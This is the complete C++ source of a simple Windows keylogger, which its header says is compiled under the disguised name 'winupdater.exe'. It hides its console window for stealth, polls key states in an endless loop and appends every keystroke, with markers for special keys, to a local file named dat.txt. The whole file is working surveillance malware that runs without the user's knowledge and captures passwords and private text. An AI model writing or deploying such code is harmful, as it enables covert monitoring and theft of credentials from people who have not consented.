
//By: Kat9_123
//Compiled with Dev-C++ to winupdater.exe

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <cstring>


//Add some stuffy's



using namespace std; //not sexually transmitted disease



void LOG(string input) {

	fstream LogFile; //Searching the 'Logfile'
	LogFile.open("dat.txt", fstream::app); //Opening the 'LogFile'
	if (LogFile.is_open()) { //Testing if the file is open
		LogFile << input; //Writing the input into the file
		LogFile.close(); //Closing the file
	}
}





int main() //Main
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Stealth
	char KEY = 'x'; //Initialisation for the 'KEY' variable

	while (true) {
		Sleep(10); //Wait 0.01 seconds
		for (int KEY = 8; KEY <= 190; KEY++) //Do some key getting
		{
			if (GetAsyncKeyState(KEY) == -32767) { //More key getting
			

					string temp;
					
					temp = KEY;
					
					
                    if (KEY == VK_SPACE) //Testing for space
					{
						temp = " ";
					}
                    if (KEY == VK_BACK) //Testing for backspace
					{
						temp = "[BP]"; 
					}
					if (KEY == VK_RETURN) //Testing for enter
					{
						temp = "\n"; 
					}
					if (KEY == VK_SHIFT) //Testing for shift
					{
						temp = "[SHIFT]";
					}
					 if (KEY == VK_TAB) //Testing for tab
					{
						temp = "[TAB]"; 
					}
					if (KEY == VK_MENU) //Testing for alt
					{
						temp = "[ALT]"; 
					}
					
					

					
					LOG(temp); //Sends the temp string to the LOG function

			

                






				
			}
		}
	}

	return 0;
}
